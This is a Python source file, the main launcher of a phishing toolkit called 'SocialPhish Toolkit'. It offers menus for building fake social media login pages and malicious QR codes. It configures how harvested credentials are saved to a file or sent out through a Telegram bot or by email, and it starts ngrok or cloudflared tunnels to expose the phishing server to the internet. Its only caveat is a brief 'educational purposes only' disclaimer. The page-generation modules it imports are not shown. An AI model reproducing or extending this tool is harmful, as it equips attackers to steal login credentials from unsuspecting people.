#!/usr/bin/env python3

import os
import sys
import argparse
import platform
import subprocess
import signal
import json
import time
import psutil
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.layout import Layout
import pyfiglet
from rich import box
from modules.qr_phisher import QRPhisher
from modules.social_phisher import SocialPhisher
from rich.prompt import Prompt
from rich.text import Text

console = Console()

# Global variables for process management
ngrok_process = None
cloudflared_process = None

def is_process_running(process):
    """Check if a process is running."""
    if process is None:
        return False
    try:
        return process.poll() is None
    except:
        return False

def kill_process(process):
    """Safely kill a process and its children."""
    if process is None:
        return
    
    try:
        parent = psutil.Process(process.pid)
        for child in parent.children(recursive=True):
            try:
                child.kill()
            except psutil.NoSuchProcess:
                pass
        parent.kill()
    except (psutil.NoSuchProcess, ProcessLookupError):
        pass

def cleanup_processes():
    """Cleanup all running processes."""
    global ngrok_process, cloudflared_process
    kill_process(ngrok_process)
    kill_process(cloudflared_process)

def signal_handler(signum, frame):
    """Handle cleanup on program exit."""
    cleanup_processes()
    sys.exit(0)

# Register signal handlers
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

def print_banner():
    """Create a stylish banner with enhanced visual effects."""
    # Create the ASCII banner
    banner = pyfiglet.figlet_format("S-Phish Tool", font="standard")
    styled_banner = ""
    colors = ["red", "yellow", "magenta", "cyan"]  # Vibrant color sequence
    lines = banner.split('\n')
    
    # Process each line of the banner with enhanced styling
    for i, line in enumerate(lines):
        if line.strip():
            color = colors[i % len(colors)]
            styled_banner += f"[{color}]{line}[/{color}]\n"
    
    # Create the layout with better proportions
    layout = Layout()
    layout.split_column(
        Layout(name="banner", ratio=12),  # Increased banner ratio
        Layout(name="status", ratio=3),   # Adjusted status ratio
        Layout(name="warning", ratio=3)    # Adjusted warning ratio
    )
    
    # Banner panel with optimized padding
    banner_panel = Panel(
        styled_banner,
        border_style="bright_red",
        padding=(1, 2),  # Reduced padding
        title="[bright_yellow]≫[/bright_yellow] [bright_red]Social Engineering Toolkit[/bright_red] [bright_yellow]≪[/bright_yellow]",
        subtitle="[bright_cyan]« Created by Iksoft Original »[/bright_cyan]",
        box=box.DOUBLE_EDGE
    )
    
    # Status panel with system information
    status_panel = Panel(
        "[bright_green][ System Ready ][/bright_green] | [yellow]Status:[/yellow] [green]Active[/green] | [yellow]Mode:[/yellow] [red]Offensive[/red]",
        border_style="bright_green",
        box=box.HEAVY,
        padding=(1, 2),
        title="[yellow]System Status[/yellow]"
    )
    
    # Warning panel with blinking attention
    warning_panel = Panel(
        "[red blink]⚠ ATTENTION ⚠[/red blink] [bright_red]USE AT YOUR OWN RISK! This tool is for educational purposes only. The developer is not responsible for any misuse or damage.[/bright_red]",
        title="[yellow]Disclaimer[/yellow]",
        border_style="red",
        box=box.HEAVY,
        padding=(1, 2)
    )
    
    # Update the layout sections
    layout["banner"].update(banner_panel)
    layout["status"].update(status_panel)
    layout["warning"].update(warning_panel)
    
    # Print the complete layout with margins
    console.print("\n")  # Add top margin
    console.print(layout)
    console.print("\n")  # Add bottom margin

def setup_argparse():
    parser = argparse.ArgumentParser(description='SocialPhish Toolkit - A Social Engineering Framework')
    parser.add_argument('-m', '--module', help='Specify module to run', choices=['qr', 'social'])
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    return parser.parse_args()

def show_menu():
    table = Table(
        title="[bright_red]Available Modules[/bright_red]",
        box=box.DOUBLE_EDGE,
        border_style="bright_green"
    )
    table.add_column("[cyan]ID[/cyan]", style="cyan", justify="center")
    table.add_column("[green]Module[/green]", style="green")
    table.add_column("[yellow]Description[/yellow]", style="yellow")

    table.add_row(
        "01", 
        "[bright_green]Social Media Phishing[/bright_green]", 
        "Create phishing pages for social platforms"
    )
    table.add_row(
        "02", 
        "[bright_green]QR Phishing[/bright_green]", 
        "Create malicious QR codes for phishing"
    )
    table.add_row(
        "03", 
        "[bright_green]Settings[/bright_green]", 
        "Configure output and notification settings"
    )
    table.add_row(
        "04", 
        "[bright_red]Exit[/bright_red]", 
        "Exit the toolkit"
    )

    console.print(Panel(table, border_style="bright_green", box=box.HEAVY_EDGE))

def manage_settings():
    """Manage toolkit settings."""
    settings_file = 'config/landing_settings.json'
    settings = {}
    
    # Load existing settings if available
    if os.path.exists(settings_file):
        with open(settings_file, 'r') as f:
            settings = json.load(f)
    
    while True:
        console.print(Panel("[bold blue]Settings Management[/bold blue]"))
        console.print("\n1. View Current Settings")
        console.print("2. Configure Output Method")
        console.print("3. Configure Telegram Settings")
        console.print("4. Configure Email Settings")
        console.print("5. Configure Ngrok Settings")
        console.print("6. Reset All Settings")
        console.print("7. Save and Return")
        
        choice = Prompt.ask("Select option", choices=["1", "2", "3", "4", "5", "6", "7"])
        
        if choice == "1":
            console.print("\n")
            
            # Output Method Settings
            output_table = Table(title="[bold cyan]Output Method Settings[/bold cyan]", show_header=True, header_style="bold magenta", show_lines=True)
            output_table.add_column("Setting", style="cyan")
            output_table.add_column("Value", style="yellow")
            output_table.add_row("Output Method", settings.get('output_method', '[italic]Not configured - Using default: file[/italic]'))
            output_table.add_row("Output File", settings.get('output_file', '[italic]Not configured - Using default: output/harvested/credentials.txt[/italic]'))
            console.print(output_table)
            console.print("\n")
            
            # Telegram Settings
            telegram_table = Table(title="[bold cyan]Telegram Settings[/bold cyan]", show_header=True, header_style="bold magenta", show_lines=True)
            telegram_table.add_column("Setting", style="cyan")
            telegram_table.add_column("Value", style="yellow")
            telegram_table.add_row(
                "Bot Token",
                "********" + settings['telegram_bot_token'][-4:] if settings.get('telegram_bot_token') else "[italic]Not configured[/italic]"
            )
            telegram_table.add_row(
                "Chat ID",
                settings.get('telegram_chat_id', "[italic]Not configured[/italic]")
            )
            console.print(telegram_table)
            console.print("\n")
            
            # Email Settings
            email_table = Table(title="[bold cyan]Email Settings[/bold cyan]", show_header=True, header_style="bold magenta", show_lines=True)
            email_table.add_column("Setting", style="cyan")
            email_table.add_column("Value", style="yellow")
            email_table.add_row(
                "SMTP Server",
                settings.get('email_smtp_server', "[italic]Not configured[/italic]")
            )
            email_table.add_row(
                "SMTP Port",
                str(settings.get('email_smtp_port', "[italic]Not configured - Default: 587[/italic]"))
            )
            email_table.add_row(
                "Email Address",
                settings.get('email_address', "[italic]Not configured[/italic]")
            )
            email_table.add_row(
                "Email Password",
                "********" if settings.get('email_password') else "[italic]Not configured[/italic]"
            )
            email_table.add_row(
                "Notification Email",
                settings.get('notification_email', "[italic]Not configured[/italic]")
            )
            console.print(email_table)
            console.print("\n")
            
            # Ngrok Settings
            ngrok_table = Table(title="[bold cyan]Ngrok Settings[/bold cyan]", show_header=True, header_style="bold magenta", show_lines=True)
            ngrok_table.add_column("Setting", style="cyan")
            ngrok_table.add_column("Value", style="yellow")
            ngrok_table.add_row(
                "Ngrok Token",
                "********" + settings['ngrok_token'][-4:] if settings.get('ngrok_token') else "[italic]Not configured[/italic]"
            )
            console.print(ngrok_table)
            console.print("\n")
            
            console.print("[cyan]Press Enter to continue...[/cyan]")
            input()
            
        elif choice == "2":
            console.print("\nSelect output method:")
            console.print("1. File")
            console.print("2. Telegram")
            console.print("3. Email")
            output_choice = Prompt.ask("Choose method", choices=["1", "2", "3"])
            
            method_map = {"1": "file", "2": "telegram", "3": "email"}
            settings['output_method'] = method_map[output_choice]
            console.print("[green]Output method updated[/green]")
            
        elif choice == "3":
            settings['telegram_bot_token'] = Prompt.ask("Enter Telegram Bot Token", password=True)
            settings['telegram_chat_id'] = Prompt.ask("Enter Telegram Chat ID")
            console.print("[green]Telegram settings updated[/green]")
            
        elif choice == "4":
            settings['email_smtp_server'] = Prompt.ask("Enter SMTP Server")
            settings['email_smtp_port'] = int(Prompt.ask("Enter SMTP Port", default="587"))
            settings['email_address'] = Prompt.ask("Enter Email Address")
            settings['email_password'] = Prompt.ask("Enter Email Password", password=True)
            settings['notification_email'] = Prompt.ask("Enter Notification Email (where to send alerts)")
            console.print("[green]Email settings updated[/green]")
            
        elif choice == "5":
            settings['ngrok_token'] = Prompt.ask("Enter Ngrok Authtoken", password=True)
            console.print("[green]Ngrok settings updated[/green]")
            
        elif choice == "6":
            confirm = Prompt.ask("[red]Are you sure you want to reset all settings? (yes/no)[/red]", choices=["yes", "no"])
            if confirm == "yes":
                settings = {}  # Reset all settings to empty
                if os.path.exists(settings_file):
                    os.remove(settings_file)  # Remove the settings file
                console.print("[green]All settings have been reset successfully[/green]")
            else:
                console.print("[yellow]Reset cancelled[/yellow]")
            
        elif choice == "7":
            # Create config directory if it doesn't exist
            os.makedirs('config', exist_ok=True)
            
            # Save settings
            with open(settings_file, 'w') as f:
                json.dump(settings, f, indent=4)
            console.print("[green]Settings saved successfully[/green]")
            break

def start_tunnel_service(service_type, port):
    """Start and manage tunnel services (ngrok/cloudflared)."""
    global ngrok_process, cloudflared_process
    
    if service_type == "ngrok":
        # Check if ngrok is already running
        if is_process_running(ngrok_process):
            console.print("[yellow]Ngrok is already running[/yellow]")
            return True
            
        # Kill any existing ngrok processes
        cleanup_processes()
        
        try:
            if platform.system() == "Windows":
                ngrok_process = subprocess.Popen(
                    ["ngrok", "http", str(port)],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            else:
                ngrok_process = subprocess.Popen(
                    ["ngrok", "http", str(port)],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
            time.sleep(3)  # Wait for ngrok to start
            return True
        except Exception as e:
            console.print(f"[red]Error starting ngrok: {str(e)}[/red]")
            return False
            
    elif service_type == "cloudflared":
        # Check if cloudflared is already running
        if is_process_running(cloudflared_process):
            console.print("[yellow]Cloudflared is already running[/yellow]")
            return True
            
        # Kill any existing cloudflared processes
        cleanup_processes()
        
        try:
            if platform.system() == "Windows":
                cloudflared_process = subprocess.Popen(
                    ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            else:
                cloudflared_process = subprocess.Popen(
                    ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
            time.sleep(3)  # Wait for cloudflared to start
            return True
        except Exception as e:
            console.print(f"[red]Error starting cloudflared: {str(e)}[/red]")
            return False
    
    return False

def main():
    try:
        args = setup_argparse()
        print_banner()
        
        if args.module:
            if args.module == 'qr':
                qr_phisher = QRPhisher()
                qr_phisher.run()
            elif args.module == 'social':
                social_phisher = SocialPhisher()
                social_phisher.run()
        else:
            while True:
                show_menu()
                # Accept both formats: 1/01, 2/02, etc.
                choice = Prompt.ask("Select an option", choices=["1", "01", "2", "02", "3", "03", "4", "04"])
                
                # Normalize the choice to remove leading zero
                choice = str(int(choice))
                
                if choice == "1":
                    social_phisher = SocialPhisher()
                    social_phisher.run()
                elif choice == "2":
                    qr_phisher = QRPhisher()
                    qr_phisher.run()
                elif choice == "3":
                    manage_settings()
                elif choice == "4":
                    cleanup_processes()
                    console.print("[green]Thank you for using SocialPhish Toolkit![/green]")
                    sys.exit(0)
    except KeyboardInterrupt:
        cleanup_processes()
        console.print("\n[yellow]Exiting...[/yellow]")
        sys.exit(0)
    except Exception as e:
        console.print(f"[red]An error occurred: {str(e)}[/red]")
        cleanup_processes()
        sys.exit(1)

if __name__ == "__main__":
    main() 